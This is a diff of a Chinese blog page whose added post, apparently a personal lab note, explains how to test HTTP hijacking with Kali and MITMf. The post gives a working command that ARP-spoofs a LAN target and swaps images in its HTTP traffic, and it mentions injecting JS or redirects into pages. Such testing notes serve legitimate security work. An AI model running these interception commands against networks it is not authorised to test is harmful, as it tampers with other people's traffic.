@@ -11,7 +11,7 @@
 
     <title>
         
-        
+        网络安全测试之http劫持 - undefined
         
     </title>
 
@@ -65,7 +65,7 @@
                     <span>标签</span>
                 </a>
             </li>
-            <li  class=active >
+            <li >
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
                     <span>存档</span>
@@ -87,6 +87,10 @@
             
         </ul>
     </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#测试步骤"><span class="toc-text">测试步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#关键命令"><span class="toc-text">关键命令</span></a></li></ol>
+</div>
     
 </div>
 
@@ -114,65 +118,60 @@
         
 
 
-<!-- 归档列表 -->
+<div class="post-container">
+    <div class="post-title">
+        网络安全测试之http劫持
+    </div>
 
-<div class="archives-container">
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-08-13 08:37:36</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#网络安全" title="网络安全">网络安全</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#http劫持" title="http劫持">http劫持</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h1><ol>
+<li><p>安装VirtualBox；</p>
+</li>
+<li><p>安装kaili系统<br>在VirtualBox新建一台虚拟机，安装kali操作系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.kali.org/downloads/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装MITMf工具<br>在kali系统中安装MITMf工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/byt3bl33d3r/MITMf/blob/master/README.md</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开始测试<br>使用MITMF工具里的Spoof模块的arp攻击劫持机顶盒流量，再用Inject模块向返回的HTML页面注入JS代码或者跳转；<br>可参考:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.361doc.com/content/17/0123/17/33093582_624375844.shtml</span><br></pre></td></tr></table></figure>
 
-<div class="one-tag-list">
-                <span class="fa fa-calendar-times-o listing-seperator" id="2019">
-                    <span class="tag-text">2019</span>
-                </span>
-    <ul>
-        
-        <!-- <li class="listing-item">
-        <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-        <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-        </li> -->
-        <li >
-            <span>08-13</span>
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/2019/08/13/网络安全测试之http劫持/">
-                        <span>
-                            网络安全测试之http劫持
-                        </span>
-            </a>
-            <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </li>
-        
-        <!-- <li class="listing-item">
-        <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-        <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-        </li> -->
-        <li >
-            <span>08-12</span>
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/2019/08/12/网络安全测试之DNS劫持/">
-                        <span>
-                            网络安全测试之DNS劫持
-                        </span>
-            </a>
-            <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </li>
-        
-        <!-- <li class="listing-item">
-        <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-        <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-        </li> -->
-        <li >
-            <span>08-10</span>
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/2019/08/10/wireshark-show-http-response-time/">
-                        <span>
-                            wireshark如何显示http响应时间
-                        </span>
-            </a>
-            <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </li>
-        
+</li>
+</ol>
+<h1 id="关键命令"><a href="#关键命令" class="headerlink" title="关键命令"></a>关键命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/bin/MITMf/</span><br><span class="line">python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.13 --imgrand --img-dir /home</span><br></pre></td></tr></table></figure>
 
-    </ul>
-</div>
+<p>这个命令可以替换HTTP流量里的图片（图片文件放到/home），但是会把所有图片换掉，随机替换，无法指定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 ip host 192.168.1.13</span><br></pre></td></tr></table></figure>
 
+<p>上面的命令可以观察流量是否被劫持过来，可以辅助定位问题。<br>注意：如果http服务的端口不是80，那么需要修改core/utils.py文件，找到其中的80替换即可。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
 </div>
 
     </div>
@@ -213,7 +212,7 @@
     // We expose some of the variables needed by the front end
     window.hexo_search_path = "search.json"
     window.hexo_root = "/"
-    window.isPost = false
+    window.isPost = true
 </script>
 <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
 <script src="/js/index.js"></script>
